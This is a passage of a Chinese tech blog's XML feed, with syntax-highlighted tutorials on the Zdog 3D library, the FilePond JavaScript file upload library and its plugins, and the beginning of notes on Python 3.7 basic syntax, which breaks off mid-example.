keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        addTo<span class="token punctuation">:</span> newcanvas<span class="token punctuation">,</span>        diameter<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 你可以理解z轴向前移动40个像素</span>        translate<span class="token punctuation">:</span> <span class="token punctuation">{</span> z<span class="token punctuation">:</span> <span class="token number">40</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        stroke<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        color<span class="token punctuation">:</span> <span class="token string">'#636'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 画矩形</span>    <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Rect</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        addTo<span class="token punctuation">:</span> newcanvas<span class="token punctuation">,</span>        width<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        height<span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 你可以理解z轴向后移动40个像素</span>        translate<span class="token punctuation">:</span> <span class="token punctuation">{</span> z<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">40</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        stroke<span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        color<span class="token punctuation">:</span> <span class="token string">'#E62'</span><span class="token punctuation">,</span>        fill<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 通过逐步增加xxx.rotate.y来改变场景的旋转。值越大越快。</span>        newcanvas<span class="token punctuation">.</span>rotate<span class="token punctuation">.</span>y <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0.03</span><span class="token punctuation">;</span>        newcanvas<span class="token punctuation">.</span><span class="token function">updateRenderGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 动画下一帧继续执行函数</span>        <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span> animate <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 开始动画，执行函数</span>    <span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><img src="images/3.gif" alt="3"></p><p>第一个画布是<strong>初始静态演示</strong>，第二个画布是<strong>动画</strong>，第三个画布是由第一个画布<strong>放大</strong>，第四个画布是通过<strong>拖动</strong>实现不规则<strong>旋转</strong>。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>Zdog 可以设计和显示简单的 3D 模型而不需要很多开销。这让我们成为一个灵魂画手简单了很多，如果你想给自己的网站增添色彩，不妨试试 Zdog 吧。如果各位感兴趣的话，下一期我将带领大家成为一位代码上的灵魂画手！</p><h2 id="五、参考资料"><a href="#五、参考资料" class="headerlink" title="五、参考资料"></a>五、参考资料</h2><p><a href="https://zzz.dog/" target="_blank" rel="noopener">Zdog官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> 开源项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>功能强大的 JS 文件上传库：FilePond</title>
      <link href="/2019/08/23/gong-neng-qiang-da-de-js-wen-jian-shang-chuan-ku-filepond/"/>
      <url>/2019/08/23/gong-neng-qiang-da-de-js-wen-jian-shang-chuan-ku-filepond/</url>
      
        <content type="html"><![CDATA[<h1 id="功能强大的-JS-文件上传库：FilePond"><a href="#功能强大的-JS-文件上传库：FilePond" class="headerlink" title="功能强大的 JS 文件上传库：FilePond"></a>功能强大的 JS 文件上传库：FilePond</h1><p><img src="images/0.png" alt="0"></p><p align="center">本文作者：HelloGitHub-<strong>kalifun</strong></p><p align="center"><strong>本文首发 HelloGitHub 欢迎大家加入 HelloGitHub-Team 大家庭</strong></p><p>这是 HelloGitHub 推出的<a href="https://github.com/HelloGitHub-Team/Article" target="_blank" rel="noopener">《讲解开源项目》</a>系列，今天给大家推荐一个 JavaScript 开源的文件上传库项目——FilePond</p><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><h3 id="1-1-FilePond"><a href="#1-1-FilePond" class="headerlink" title="1.1 FilePond"></a>1.1 FilePond</h3><p>它是一个 JavaScript 文件上传库。可以拖入上传文件，并且会对图像进行优化以加快上传速度。让用户体验到出色、进度可见、如丝般顺畅的用户体验。</p><blockquote><p>FilePond 项目地址：<a href="https://github.com/pqina/filepond" target="_blank" rel="noopener">https://github.com/pqina/filepond</a></p></blockquote><p><img src="images/1.gif" alt="1"></p><h3 id="1-2-特点和优势"><a href="#1-2-特点和优势" class="headerlink" title="1.2 特点和优势"></a>1.2 特点和优势</h3><ul><li>上传内容：支持目录、文件、多个文件、本地路径、远程 URL 等。</li><li>文件管理：删除文件、选择文件、复制和粘贴文件、或使用 API 方式添加文件。</li><li>上传方式：使用 AJAX 进行异步上传、或将文件编码为 base64 数据用表单发送。</li><li>图像优化：自动调整图像大小、裁剪和修复 EXIF 方向。</li><li>响应式：可在移动和桌面设备上使用。</li></ul><p>看了效果图和功能介绍，是不是有些手痒了。接下来就是实战操作部分，大家可以跟着文章一步步的把这个库使用起来，点亮你的文件上传技能点！</p><h2 id="二、实战操作"><a href="#二、实战操作" class="headerlink" title="二、实战操作"></a>二、实战操作</h2><p>下面我们将一步步的讲解如何使用 FilePond 这个库。我们采用的是最简单的 CDN 引用方式，方便大家能够快速体检其魅力（复制代码便可查看效果），接着会深入讲解每个插件的功能，最终编写了一个组合了几个插件的示例及运行效果展示。</p><p><strong>Tips：</strong> 解释说明均在代码中以注释方式展示，请大家注意阅读。</p><h3 id="2-1-快速使用（CDN）"><a href="#2-1-快速使用（CDN）" class="headerlink" title="2.1 快速使用（CDN）"></a>2.1 快速使用（CDN）</h3><p>示例代码：</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- html 标题 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>FilePond from CDN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 引入Filepond的css --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond/dist/filepond.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- input标签作为文件上传入口 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>filepond<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 引入FilePond的js --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond/dist/filepond.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token comment" spellcheck="true">// FilePond.parse 使用类.filepond解析DOM树的给定部分，并将它们转换为FilePond元素。</span>  FilePond<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>展示效果：</p><p><img src="images/3.png" alt></p><h3 id="2-2-引入插件"><a href="#2-2-引入插件" class="headerlink" title="2.2 引入插件"></a>2.2 引入插件</h3><p>似乎单纯的上传功能是否无法满足我们的需求，FilePond 该库拥有多样、强大的插件部分，可以根据自己的需求选择插件组合起来使用哦。​下面先简单的了解一下每个插件的功能：</p><ul><li>File Rename：重命名客户端上的文件</li><li>File Encode：将文件编码为 base64 数据</li><li>File size Validation：文件大小验证工具</li><li>File Type Validation：文件类型验证工具</li><li>File Metadata：限制要添加的文件类型</li><li>File Poster：在文件项目中显示图像</li><li>Image Preview：显示图像文件的预览</li><li>Image Edit：手动编辑图像文件</li><li>Image Crop：设置图像文件的裁剪比例</li><li>Image Resize：设置图像文件的输出尺寸</li><li>Image Transform：上传之前在客户端上图像变换</li><li>Image EXIF Orientation：提取 <a href="https://baike.baidu.com/item/Exif/422825?fr=aladdin" target="_blank" rel="noopener">EXIF</a> 方向信息</li><li>Image Size Validation：限制要添加的图像的尺寸</li><li>Image Filter：将颜色矩阵应用于图像像素</li></ul><p>下面我来介绍如何引入插件吧！</p><p><strong>坑！：</strong> 使用插件前，一定要查阅清楚该插件是否有 CSS 文件，如果有请在<code>&lt;head&gt;&lt;link href=&quot;xxx.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;</code>标签中引入哦。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 引入图像预览插件的css文件 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-preview/dist/filepond-plugin-image-preview.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 引入图像预览插件的js文件 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-preview/dist/filepond-plugin-image-preview.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token comment" spellcheck="true">// 注册插件 FilePondPluginImagePreview 图像预览插件为已上传的图像呈现缩小的预览。</span>FilePond<span class="token punctuation">.</span><span class="token function">registerPlugin</span><span class="token punctuation">(</span>FilePondPluginImagePreview<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>我们梳理一下引入插件的步骤：</p><ol><li>引入 CSS 文件（部分插件有 CSS 文件）</li><li>引入 JS 文件</li><li>注册插件</li><li>配置插件（部分插件需配置）</li></ol><h3 id="2-3-配合插件使用"><a href="#2-3-配合插件使用" class="headerlink" title="2.3 配合插件使用"></a>2.3 配合插件使用</h3><p>完整示例代码：</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>FilePond from CDN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- Filepond CSS --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond/dist/filepond.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--    FilePondPluginImagePreview 插件 CSS--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-preview/dist/filepond-plugin-image-preview.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--    FilePondPluginImageEdit 插件 CSS--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-edit/dist/filepond-plugin-image-edit.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 我们将把这个输入框变成上传文件框 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>filepond<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- FilePondPluginImagePreview 插件js--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-preview/dist/filepond-plugin-image-preview.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--FilePondPluginImageEdit 插件js--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-edit/dist/filepond-plugin-image-edit.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--FilePondPluginFileValidateSize 插件js--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-file-validate-size/dist/filepond-plugin-file-validate-size.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--FilePondPluginFileValidateType 插件js--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-file-validate-type/dist/filepond-plugin-file-validate-type.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--FilePondPluginImageCrop 插件js--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-crop/dist/filepond-plugin-image-crop.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--FilePondPluginImageExifOrientation 插件js--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond-plugin-image-exif-orientation/dist/filepond-plugin-image-exif-orientation.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--引入Filepond的js--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/filepond/dist/filepond.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token comment" spellcheck="true">// querySelector() 方法返回文档中匹配指定 CSS 选择器的一个元素。</span>    <span class="token keyword">var</span> inputElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[type="file"]'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 注册插件</span>    <span class="token comment" spellcheck="true">// FilePondPluginImagePreview  上传时可以预览到上传的图片等</span>    <span class="token comment" spellcheck="true">// FilePondPluginImageEdit   由于doka收费，所以编辑功能就不演示了。</span>    <span class="token comment" spellcheck="true">// FilePondPluginFileValidateType  图片类型</span>    <span class="token comment" spellcheck="true">// FilePondPluginImageCrop 图像裁剪</span>    <span class="token comment" spellcheck="true">// FilePondPluginFileValidateSize   文件大小验证插件处理阻止太大的文件。</span>    FilePond<span class="token punctuation">.</span><span class="token function">registerPlugin</span><span class="token punctuation">(</span>        FilePondPluginImagePreview<span class="token punctuation">,</span>        FilePondPluginImageEdit<span class="token punctuation">,</span>        FilePondPluginFileValidateSize<span class="token punctuation">,</span>        FilePondPluginImageCrop<span class="token punctuation">,</span>        FilePondPluginFileValidateType<span class="token punctuation">,</span>        FilePondPluginImageExifOrientation    <span class="token punctuation">)</span><span class="token punctuation">;</span>    FilePond<span class="token punctuation">.</span><span class="token function">setOptions</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 设置单个URL是定义服务器配置的最基本形式。</span>        server<span class="token punctuation">:</span> <span class="token string">'/upload'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 设置图片类型只能为png才能上传</span>        allowFileTypeValidation<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        acceptedFileTypes<span class="token punctuation">:</span> <span class="token string">"image/jpg"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 启用或禁用图像裁剪</span>        allowImageCrop<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 启用或禁用文件大小验证</span>        allowFileSizeValidation<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        maxFileSize<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 启用或禁用提取EXIF信息</span>        allowImageExifOrientation<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 使用create方法逐步增强基本文件输入到FilePond元素。</span>    FilePond<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>inputElement<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>上面的示例展示了 FilePond 常用插件的方法，效果展示如下：<br><img src="images/4.png" alt="2"></p><p>当然还有其它方法如：</p><ul><li>destroys：销毁实例</li><li>find：返回附加提供的元素的实例</li><li>getOptions：返回当前的配置项</li><li>supported：鉴别浏览器是否支持 FilePond</li></ul><p>这里就不做完整的讲解了，有兴趣的可以自行尝试使用这些方法。</p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>以上就是讲解的全部内容，FilePond 是一款很轻便的上传插件。并没有太多繁琐的配置，这里我并没有逐一针对每个插件引入进行演示，只展示了常用的部分。留意上面提示的坑，掌握上面讲解的方法，其它的插件你便可自行学习。</p><p>FilePond 是一款很值得参考和使用的 JavaScript 库，如果想让自己网站快速加入上传功能，不妨试试它吧。</p><h2 id="四、参考资料"><a href="#四、参考资料" class="headerlink" title="四、参考资料"></a>四、参考资料</h2><ul><li><a href="https://pqina.nl/filepond/docs/" target="_blank" rel="noopener">FilePond 官方文档</a></li><li><a href="https://pqina.nl/filepond/plugins.html" target="_blank" rel="noopener">FilePond Plugins List</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开源项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3.7 の 基础语法</title>
      <link href="/2019/06/19/python3-ji-chu-yu-fa/"/>
      <url>/2019/06/19/python3-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3-7-の-基础语法"><a href="#Python3-7-の-基础语法" class="headerlink" title="Python3.7 の 基础语法"></a>Python3.7 の 基础语法</h1><blockquote><p>之前一直是使用python2.7，也没有去尝试使用3的版本。今天看到python2.7将维护到2020年。因此打算把3.7基础过一遍。</p></blockquote><p><strong>我将会记录我印象中和2.7不同的。我2.7基础也不是很好，所以有的内容也可能会重复。</strong></p><hr><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><p><strong>python2.7</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span> <span class="token string">"Hello World"</span></code></pre><p><strong>python3.7</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span>这个应该算是<span class="token number">3</span>的特性，并不是指<span class="token number">3.7</span>衍生出来的。</code></pre><hr><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><strong>三重引号： “”“ ……”“”，‘’‘ …… ’‘’。字符串中的回车换行会自动包含到字符串中，如果不想包含，在行尾加入一个\即可。</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""\Usage: thingy [OPTIONS]     -h                        Display this usage message     -H hostname               Hostname to connect to"""</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">$ python 1.pyUsage: thingy <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>     -h                        Display this usage message     -H <span class="token function">hostname</span>               Hostname to connect to</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""Usage: thingy [OPTIONS]     -h                        Display this usage message     -H hostname               Hostname to connect to"""</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">$ python 1.pyUsage: thingy <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>     -h                        Display this usage message     -H <span class="token function">hostname</span>               Hostname to connect to</code></pre><p><strong>相邻的两个或者多个字符串字面值将会自动连接。这个特性我不知道2.7是否有。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'p'</span> <span class="token string">'y'</span> <span class="token string">'thon'</span><span class="token string">'python'</span></code></pre><p><strong>索引，我记得2.7就有这个特性。但是貌似我使用的不多。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> n <span class="token operator">=</span> <span class="token string">"python"</span><span class="token operator">>></span><span class="token operator">></span> n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token string">'y'</span><span class="token operator">>></span><span class="token operator">></span> n<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token string">'n'</span></code></pre><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p><strong>列表可以进行拼接</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span></code></pre><p><strong>append()方法添加新元素</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span></code></pre><p><strong>嵌套列表，这个在数据处理上就方便很多啦。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> b<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> c <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token 